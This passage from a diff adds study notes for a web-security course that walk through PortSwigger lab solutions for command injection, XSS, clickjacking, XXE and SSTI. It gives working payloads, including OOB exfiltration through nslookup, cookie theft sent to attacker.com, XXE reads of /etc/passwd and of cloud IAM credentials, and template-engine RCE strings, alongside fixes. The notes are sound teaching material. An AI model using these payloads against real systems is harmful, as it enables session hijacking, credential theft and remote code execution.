+<p>Response includes the username (<code>peter-XXXX</code>).</p>
+<p><strong>Lab 2 — Blind, time delay</strong>
+Feedback form. <code>email</code> field:</p>
+<pre><code>email=x||ping+-c+10+127.0.0.1||
+</code></pre>
+<p>Response takes ~10s → confirmed. (<code>+</code> is URL-encoded space.)</p>
+<p><strong>Lab 3 — Blind, output redirection</strong>
+Web root for served images is <code>/var/www/images/</code>.</p>
+<pre><code>email=x||whoami&gt;/var/www/images/out.txt||
+</code></pre>
+<p>Then <code>GET /image?filename=out.txt</code> returns <code>peter-XXXX</code>.</p>
+<p><strong>Lab 4 — Blind, OOB</strong></p>
+<pre><code>email=x||nslookup+x.BURPCOLLAB||
+</code></pre>
+<p>Burp Collaborator → &quot;Poll now&quot; → DNS hit confirms execution.</p>
+<p><strong>Graded Lab A — Blind, OOB data exfiltration</strong></p>
+<pre><code>email=x||nslookup+`whoami`.BURPCOLLAB||
+</code></pre>
+<p>Backticks run <code>whoami</code>, output becomes subdomain. Collaborator shows <code>peter-abc.&lt;collab&gt;</code> — submit the username <code>peter-abc</code> to solve.</p>
+<hr>
+<p><a name="session-6--xss-dom-xss--clickjacking"></a></p>
+<h2>Session 6 — XSS, DOM-Based XSS &amp; Clickjacking</h2>
+<h3>XSS in one sentence</h3>
+<p>You make <strong>someone else&#39;s browser</strong> run <strong>your JavaScript</strong> on the vulnerable site, with their cookies and permissions.</p>
+<h3>Three flavours</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Where payload is stored</th>
+<th>Trigger</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Reflected</strong></td>
+<td>In the URL/parameter</td>
+<td>Victim clicks attacker&#39;s link</td>
+</tr>
+<tr>
+<td><strong>Stored</strong></td>
+<td>Saved in DB (comment, profile)</td>
+<td>Victim visits the normal page</td>
+</tr>
+<tr>
+<td><strong>DOM-based</strong></td>
+<td>Never reaches the server — handled in client JS</td>
+<td>Often <code>location.hash</code> / <code>document.URL</code></td>
+</tr>
+</tbody></table>
+<h3>Why payload runs (mental model)</h3>
+<p>The browser parses HTML. Anywhere user input lands <strong>inside an HTML or JS context</strong> without proper encoding, an attacker can inject a <code>&lt;script&gt;</code> (or <code>onerror</code>, <code>onload</code>, <code>javascript:</code> URL, etc.) and the browser executes it as if the site wrote it.</p>
+<h3>The classic cookie-steal example</h3>
+<p>Stored comment field:</p>
+<pre><code class="language-html">&lt;script&gt;fetch(&#39;https://attacker.com/?c=&#39;+document.cookie)&lt;/script&gt;
+</code></pre>
+<p>A logged-in user views the page → their browser sends their session cookie to attacker.com.
+(<em>HttpOnly cookies block this exact attack — but most apps still have non-HttpOnly tokens, CSRF tokens etc.</em>)</p>
+<h3>Common payloads (rank by likelihood of working)</h3>
+<ol>
+<li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> — naive</li>
+<li><code>&lt;img src=x onerror=alert(1)&gt;</code> — bypasses <code>&lt;script&gt;</code> filter</li>
+<li><code>&lt;svg onload=alert(1)&gt;</code> — bypasses many tag filters</li>
+<li><code>&quot;&gt;&lt;svg onload=alert(1)&gt;</code> — break out of an attribute first</li>
+<li><code>javascript:alert(1)</code> — inside <code>href</code>/<code>src</code></li>
+<li><code>&#39;-alert(1)-&#39;</code> — inside a JS string (single quotes)</li>
+<li><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> — break out of a <code>&lt;script&gt;</code> block</li>
+</ol>
+<h3>DOM XSS — the only thing you need to remember</h3>
+<p>There are <strong>sources</strong> (where data enters): <code>location.hash</code>, <code>location.search</code>, <code>document.URL</code>, <code>document.referrer</code>, <code>window.name</code>, <code>localStorage</code>.
+There are <strong>sinks</strong> (where data executes): <code>innerHTML</code>, <code>outerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>setTimeout</code> (with string), <code>element.src</code>, jQuery <code>$()</code> with selector.
+<strong>Source → Sink without sanitisation = DOM XSS.</strong></p>
+<h3>Clickjacking</h3>
+<p>You load the target site in an <strong>invisible iframe</strong> on top of a fake page. The user thinks they&#39;re clicking your button — really they&#39;re clicking the target&#39;s &quot;Delete account&quot; button.</p>
+<p><strong>Defence:</strong> <code>X-Frame-Options: DENY</code> header OR <code>Content-Security-Policy: frame-ancestors &#39;none&#39;</code>.</p>
+<h3>The real fix for XSS</h3>
+<ul>
+<li><strong>Output encoding</strong> based on context (HTML / attribute / JS / URL — each different).</li>
+<li><strong>Content Security Policy (CSP)</strong> — <code>script-src &#39;self&#39;</code> blocks inline + remote scripts.</li>
+<li><strong>HttpOnly</strong> cookies for sessions.</li>
+<li><strong>Frameworks</strong> (React/Angular/Vue) auto-escape by default — don&#39;t bypass with <code>dangerouslySetInnerHTML</code>.</li>
+</ul>
+<h3>PortSwigger labs — class answers (most common assigned)</h3>
+<p><strong>Apprentice — Reflected XSS into HTML context, nothing encoded</strong>
+<code>?search=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p><strong>Apprentice — Stored XSS into HTML context</strong>
+Comment body: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> (or <code>&lt;img src=x onerror=alert(1)&gt;</code>)</p>
+<p><strong>Apprentice — DOM XSS in document.write via search param</strong>
+<code>?search=x&quot;&gt;&lt;svg onload=alert(1)&gt;</code></p>
+<p><strong>Apprentice — DOM XSS in innerHTML sink</strong>
+<code>?search=&lt;img src=1 onerror=alert(1)&gt;</code></p>
+<p><strong>Apprentice — Reflected XSS into attribute, angle brackets HTML-encoded</strong>
+Search payload: <code>&quot; autofocus onfocus=alert(1) x=&quot;</code> — breaks out of the attribute, adds a new event handler.</p>
+<p><strong>Apprentice — Reflected into JS string, single quote &amp; backslash escaped</strong>
+<code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> — escape out of the <code>&lt;script&gt;</code> block entirely.</p>
+<p><strong>Practitioner — Exploit XSS to steal cookies</strong>
+Stored:</p>
+<pre><code class="language-html">&lt;script&gt;fetch(&#39;https://YOUR-COLLAB/?c=&#39;+document.cookie)&lt;/script&gt;
+</code></pre>
+<p>Wait for victim to view page → cookie appears in Collaborator → use cookie to take over session.</p>
+<p><strong>Practitioner — Exploit XSS to perform CSRF</strong></p>
+<pre><code class="language-html">&lt;script&gt;
+var x=new XMLHttpRequest();
+x.open(&#39;GET&#39;,&#39;/my-account&#39;);
+x.onload=()=&gt;{
+  var t=/name=&quot;csrf&quot; value=&quot;([^&quot;]+)/.exec(x.responseText)[1];
+  var c=new XMLHttpRequest();
+  c.open(&#39;POST&#39;,&#39;/my-account/change-email&#39;);
+  c.setRequestHeader(&#39;Content-Type&#39;,&#39;application/x-www-form-urlencoded&#39;);
+  c.send(&#39;email=evil@a.com&amp;csrf=&#39;+t);
+};
+x.send();
+&lt;/script&gt;
+</code></pre>
+<p><strong>Clickjacking — basic with CSRF token protection</strong>
+Host an HTML page that iframes <code>/my-account</code> and overlays a decoy button &quot;Click for prize&quot; exactly over the &quot;Delete account&quot; button. Set iframe <code>opacity:0.0001</code>. Submit lab solution.</p>
+<hr>
+<p><a name="session-7--xxe--ssti"></a></p>
+<h2>Session 7 — XXE &amp; SSTI</h2>
+<h3>XXE — XML External Entity</h3>
+<p><strong>What:</strong> The XML parser allows defining &quot;entities&quot; (variables) that load from external sources. An attacker defines one that reads a file or pings their server.</p>
+<p><strong>Key pieces of the payload:</strong></p>
+<ul>
+<li><code>&lt;!DOCTYPE ...&gt;</code> = block where you tell the parser the rules.</li>
+<li><code>&lt;!ENTITY name &quot;value&quot;&gt;</code> = define a variable.</li>
+<li><code>&lt;!ENTITY name SYSTEM &quot;url&quot;&gt;</code> = variable loads from an <strong>external</strong> resource.</li>
+<li><code>&amp;name;</code> = use the variable somewhere in the XML body.</li>
+</ul>
+<p><strong>Lab 1 — Retrieve files via XXE</strong> <em>(in-band, file read)</em>
+The shop&#39;s stock-check sends XML. Inject:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre>
+<p>Server returns <code>/etc/passwd</code> contents in the error/response that previously echoed productId.</p>
+<p><strong>Lab 2 — XXE to perform SSRF</strong>
+Change the entity to fetch the AWS metadata endpoint:</p>
+<pre><code class="language-xml">&lt;!ENTITY xxe SYSTEM &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&quot;&gt;
+</code></pre>
+<p>The metadata response (containing IAM creds) is returned to you.</p>
+<p><strong>Lab 3 — Blind XXE with out-of-band interaction</strong>
+Response doesn&#39;t echo anything. Use Burp Collaborator:</p>
+<pre><code class="language-xml">&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN&quot;&gt; ]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;
+</code></pre>
+<p>Collaborator receives a DNS/HTTP hit → confirms blind XXE.</p>
+<p><strong>The fix:</strong> disable external entities in the XML parser:</p>
+<ul>
+<li>Java: <code>XMLInputFactory.setProperty(IS_SUPPORTING_EXTERNAL_ENTITIES, false)</code></li>
+<li>PHP: <code>libxml_disable_entity_loader(true)</code> (pre-8.0)</li>
+<li>Python: use <code>defusedxml</code> instead of standard library.</li>
+</ul>
+<hr>
+<h3>SSTI — Server-Side Template Injection</h3>
+<p><strong>What:</strong> App embeds user input directly into a server-side template (Jinja2, Twig, Freemarker, ERB, Velocity…). Attacker injects template syntax that the engine evaluates.</p>
+<p><strong>Detect:</strong> Send <code>${7*7}</code>, <code>{{7*7}}</code>, <code>&lt;%= 7*7 %&gt;</code>, <code>#{7*7}</code>, <code>*{7*7}</code> — if any reflects as <code>49</code>, you have SSTI in that engine.</p>
+<p><strong>SST Class methodology (3 steps from notes):</strong></p>
+<ol>
+<li>Look for <strong>reflection</strong> of user-controlled input.</li>
+<li><strong>Enumerate</strong> the template engine — fingerprint by which math syntax evaluates.</li>
+<li><strong>Find the payload</strong> that maps to that engine&#39;s RCE primitive.</li>
+</ol>
+<p><strong>Common engine → quick RCE payload</strong></p>
+<table>
+<thead>
+<tr>
+<th>Engine</th>
+<th>Detect</th>
+<th>RCE-ish payload</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Jinja2 (Python)</td>
+<td><code>{{7*7}}</code> → 49</td>
+<td><code>{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;id&#39;).read()}}</code></td>
+</tr>
+<tr>
+<td>Twig (PHP)</td>
+<td><code>{{7*7}}</code> → 49</td>
+<td><code>{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}</code></td>
+</tr>
+<tr>
+<td>Freemarker (Java)</td>
+<td><code>${7*7}</code> → 49</td>
+<td><code>&lt;#assign x=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${x(&quot;id&quot;)}</code></td>
+</tr>
+<tr>
+<td>ERB (Ruby)</td>
+<td><code>&lt;%= 7*7 %&gt;</code> → 49</td>
+<td><code>&lt;%= system(&quot;id&quot;) %&gt;</code></td>
+</tr>
+<tr>
+<td>Velocity (Java)</td>
+<td><code>#set($x=7*7)$x</code> → 49</td>
+<td><code>#set($e=&quot;exp&quot;)${e.getClass().forName(&quot;Runtime&quot;)...exec(&quot;id&quot;)}</code></td>
+</tr>
+</tbody></table>
+<p><strong>Lab 1 — Basic SSTI</strong>
+Engine is ERB. Vulnerable param reflected. Payload:</p>
+<pre><code>&lt;%= system(&quot;rm /home/carlos/morale.txt&quot;) %&gt;
+</code></pre>
+<p><strong>The fix:</strong> never concatenate user input into templates. Use the engine&#39;s &quot;context&quot; API to pass data as variables. Sandbox/disable dangerous tags. Treat templates as code.</p>
+<hr>
+<p><a name="assignment"></a></p>
+<h2>Assignment — Threat Model (Session 3 graded)</h2>
+<p><strong>Task:</strong> for the provided web app architecture diagram, do <strong>two deliverables</strong>:</p>
+<h3>Part 1 — DFD Level 1 (on pen &amp; paper)</h3>
+<p>Use the 5 standard symbols. Make sure to label:</p>
+<ul>
+<li>Every external entity (user browser, third-party API).</li>
+<li>Every process (web server, API, auth service, background worker).</li>
+<li>Every data store (DB, S3, cache).</li>
+<li>Every data flow (HTTP request, SQL query, message queue).</li>
+<li>Every trust boundary (Internet ↔ VPC, public ↔ private subnet).</li>
+</ul>
+<p>Take a clear photo/scan → upload.</p>
+<h3>Part 2 — STRIDE table (Excel)</h3>
+<p>For each component on the DFD, write <strong>at least 2 threats</strong>, one per STRIDE category where it applies.</p>
+<p>Each row: <code>Component | Threat Description | STRIDE Category | Attack Vector | Impact | Mitigation</code>.</p>
+<p><strong>Example row (web server):</strong></p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Threat</th>
+<th>STRIDE</th>
+<th>Attack Vector</th>
+<th>Impact</th>
+<th>Mitigation</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Login API</td>
+<td>SQLi in username field bypasses auth</td>
+<td>T</td>
+<td><code>&#39; OR &#39;1&#39;=&#39;1&#39;--</code> in POST body</td>
+<td>Full DB read, admin takeover</td>
+<td>Parameterized queries, least-priv DB user</td>
+</tr>
+</tbody></table>
+<p><strong>Tip for marks:</strong></p>
+<ul>
+<li>Don&#39;t write generic threats (&quot;attacker exploits server&quot;). Write <em>specific</em> threats (&quot;SQLi in <code>/api/login</code> username field&quot;).</li>
+<li>Pair each with a <em>specific</em> mitigation (a control, not &quot;use security&quot;).</li>
+<li>Cover all components on the DFD. Aim for 12-20 rows minimum.</li>
+<li>If using DREAD: add the score column and sort by risk.</li>
+</ul>
+<hr>
+<p><a name="quick-exam-summary"></a></p>
+<h2>Quick exam-style summary</h2>
+<h3>&quot;What&#39;s the root cause of injection bugs?&quot;</h3>
+<p>User input is concatenated into a string passed to an interpreter (DB, shell, template engine, XML parser). The interpreter can&#39;t separate code from data. Fix = parameterized API.</p>
+<h3>&quot;How many columns in a UNION attack?&quot;</h3>
+<p>Use <code>NULL</code> padding or <code>ORDER BY n</code> — increment until error.</p>
+<h3>&quot;What does <code>--</code> do in SQLi?&quot;</h3>
+<p>Starts a SQL comment — everything after it on the line is ignored. Strips the rest of the original query.</p>
+<h3>&quot;Why is <code>subprocess.run([&quot;ping&quot;,&quot;-c&quot;,&quot;1&quot;,hostname], shell=False)</code> safe but <code>os.system(&quot;ping -c 1 &quot; + hostname)</code> not?&quot;</h3>
+<p>List form passes args directly via <code>execve()</code> — no shell parses the metacharacters. With <code>os.system</code>, a shell is invoked, and <code>;</code> etc. become command separators.</p>
+<h3>&quot;STRIDE in 30 seconds&quot;</h3>
+<p>Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege — one per CIA-ish property: Authentication, Integrity, Non-repudiation, Confidentiality, Availability, Authorization.</p>
+<h3>&quot;DREAD formula&quot;</h3>
+<p><code>Risk = (Damage + Reproducibility + Exploitability + Affected users + Discoverability) / 5</code></p>
+<h3>&quot;DFD levels&quot;</h3>
+<p>0 = context · 1 = main processes (use for TM) · 2 = sub-processes · 3 = function-level.</p>
+<h3>&quot;Difference between attack surface and attack vector&quot;</h3>
+<p>Surface = entry points that <em>exist</em>. Vector = the <em>specific path/technique</em> used through one of those entry points.</p>
+<h3>&quot;Reflected vs Stored vs DOM XSS&quot;</h3>
+<ul>
+<li>Reflected: payload in URL → server reflects in response.</li>
+<li>Stored: payload saved server-side → triggers on every view.</li>
+<li>DOM: payload never sent to server — handled by client-side JS source → sink.</li>
+</ul>
+<h3>&quot;Why is HttpOnly important?&quot;</h3>
+<p>JS can&#39;t read <code>document.cookie</code> for cookies marked HttpOnly → defeats the basic <code>fetch(&#39;attacker?c=&#39;+document.cookie)</code> XSS exfil.</p>
+<h3>&quot;X-Frame-Options vs CSP frame-ancestors&quot;</h3>
+<p>Both stop clickjacking. CSP <code>frame-ancestors</code> is the modern replacement, supports multiple sources.</p>
+<h3>&quot;What does <code>&amp;xxe;</code> do in the XXE payload?&quot;</h3>
+<p>It&#39;s a reference to the entity defined in <code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>. When the parser sees <code>&amp;xxe;</code> in the XML body, it substitutes the loaded file contents.</p>
+<h3>&quot;How do you confirm blind injection?&quot;</h3>
+<p>Time delay (<code>sleep</code>) or OOB callback (Burp Collaborator DNS/HTTP). Use Collaborator when time delays are unreliable or filtered.</p>
+<h3>&quot;Why is SQLi-via-error different from blind?&quot;</h3>
+<p>Error-based: DB error string contains your extracted data. Blind: no data at all, just a true/false or timing signal.</p>
+<h3>&quot;Difference between SAST and DAST&quot;</h3>
+<p>SAST reads <strong>source code</strong> statically (Semgrep, Bandit, CodeQL). DAST tests the <strong>running app</strong> (Burp, OWASP ZAP, Nuclei).</p>
+<h3>&quot;Top web tools to know by name&quot;</h3>
+<p>nmap (network), Burp (web proxy), SQLmap (auto SQLi), Gobuster/FFUF (dir brute), Nuclei (templated CVE), Hydra (online brute), Hashcat (offline crack), Metasploit (exploit framework).</p>
+<hr>
+<h2>Cross-reference</h2>
+<p>For <em>every</em> PortSwigger topic (not just the ones in lecture) — including Authentication, Access Control, SSRF, CSRF, CORS, WebSockets, OAuth, JWT, Race Conditions, GraphQL, Deserialization, Request Smuggling, Cache Poisoning, Host Header, Prototype Pollution, Web LLM, Path Traversal, File Upload, NoSQL, API Testing, Web Cache Deception, Information Disclosure, Business Logic — see the companion file:</p>
+<p>→ <strong><code>PortSwigger-WebSecurity-Notes.md</code></strong> (full coverage of all 30 topics with lab solutions).</p>
+
+</article>
+
+<a class="totop" id="totop" href="#" aria-label="Back to top">↑</a>
+<script>
+const t=document.getElementById('totop');
+addEventListener('scroll',()=>{t.classList.toggle('show',scrollY>600)});
+t.addEventListener('click',e=>{e.preventDefault();scrollTo({top:0,behavior:'smooth'})});
+</script>
+</body>
+</html>
